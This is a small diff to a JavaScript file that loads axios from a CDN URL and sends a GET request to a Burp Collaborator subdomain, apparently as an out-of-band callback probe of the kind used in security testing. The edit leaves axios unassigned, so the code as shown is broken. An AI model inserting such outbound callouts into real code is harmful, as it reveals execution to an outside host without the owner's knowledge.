@@ -1,6 +1,7 @@
 // const axios = require('axios')
 // import axios from 'axios'
-const axios = require("https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js")
+// const axios = 
+require("https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js")
 
 axios
   .get('ct9xmxzn1rxdhr4bnz0dtcdz9qfh36.burpcollaborator.net/from_axois/')
